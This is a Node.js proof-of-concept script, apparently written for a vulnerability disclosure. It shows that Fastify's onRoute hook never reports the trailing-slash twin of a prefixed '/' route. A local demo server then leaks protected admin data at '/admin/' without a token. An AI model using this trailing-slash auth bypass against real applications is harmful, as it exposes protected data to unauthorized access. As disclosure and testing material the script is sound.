'use strict'
/*
 * PoC — L1: onRoute blind spot for the trailing-slash twin -> auth bypass
 * ---------------------------------------------------------------------------
 * A route declared at path '/' INSIDE a plugin that has a non-empty prefix is
 * registered by Fastify's default `prefixTrailingSlash: 'both'` as TWO routable
 * paths: `/prefix` and `/prefix/`. However the `onRoute` hook fires only for
 * the first one (lib/route.js:262 registers the twin with `prefixing: true`,
 * and lib/route.js:293 gates the onRoute hooks on `prefixing === false`).
 *
 * Any security control that learns which routes exist / need protection by
 * subscribing to `onRoute` (RBAC registries, auth gateways, rate-limiters,
 * WAF policy, CSRF exemption lists, audit) is therefore BLIND to `/prefix/`,
 * even though it runs the exact same handler. The attacker just appends `/`.
 *
 * This script starts a real server that enforces auth via an onRoute-built
 * registry (a common pattern) and shows that `GET /admin` is blocked while
 * `GET /admin/` returns the protected data unauthenticated.
 *
 *   Run:  node poc.js
 */
const path = require('path')
const http = require('http')
const Fastify = require(path.join(__dirname, '..', '..', 'fastify.js'))

const app = Fastify({ logger: false })

// ---- A common RBAC pattern: build the "protected routes" set from onRoute ----
const protectedRoutes = new Set()
app.addHook('onRoute', (routeOptions) => {
  protectedRoutes.add(`${routeOptions.method}:${routeOptions.url}`)
})

// ---- Central auth gate consults the registry the app built above ----
app.addHook('onRequest', (req, reply, done) => {
  const key = `${req.method}:${req.url.split('?')[0]}`
  if (protectedRoutes.has(key) && req.headers['authorization'] !== 'Bearer good') {
    reply.code(401).send({ error: 'DENIED', route: key })
    return
  }
  done()
})

// ---- Admin dashboard mounted under a prefix, with its index route at '/' ----
app.register(async (instance) => {
  instance.get('/', async () => ({ secret: 'ADMIN DASHBOARD DATA' }))
}, { prefix: '/admin' })

function get (port, path) {
  return new Promise((resolve) => {
    http.get({ host: '127.0.0.1', port, path }, (res) => {
      let b = ''; res.on('data', (d) => (b += d)); res.on('end', () => resolve({ status: res.statusCode, body: b }))
    }).on('error', (e) => resolve({ status: 'ERR', body: e.code }))
  })
}

app.listen({ port: 0, host: '127.0.0.1' }).then(async () => {
  const port = app.server.address().port
  console.log('=== L1 PoC: onRoute trailing-slash twin -> auth bypass ===\n')
  console.log('Routes the app "knows about" via onRoute (its protected set):')
  console.log('  ', [...protectedRoutes].join('\n   '))
  console.log('  ^ note: GET:/admin/ is MISSING — the twin was never announced\n')

  const canonical = await get(port, '/admin')     // no auth header
  const twin = await get(port, '/admin/')         // no auth header

  console.log(`GET /admin   (no token) -> ${canonical.status}  ${canonical.body}`)
  console.log(`GET /admin/  (no token) -> ${twin.status}  ${twin.body}\n`)

  const bypassed = twin.status === 200 && /ADMIN DASHBOARD/.test(twin.body) && canonical.status === 401
  if (bypassed) {
    console.log('==> VULNERABLE: the auth gate blocked /admin but /admin/ leaked the protected data')
    console.log('    unauthenticated. The trailing-slash twin bypasses the onRoute-based control.')
    process.exit(0)
  } else {
    console.log('==> Not reproduced in this environment.')
    process.exit(1)
  }
})
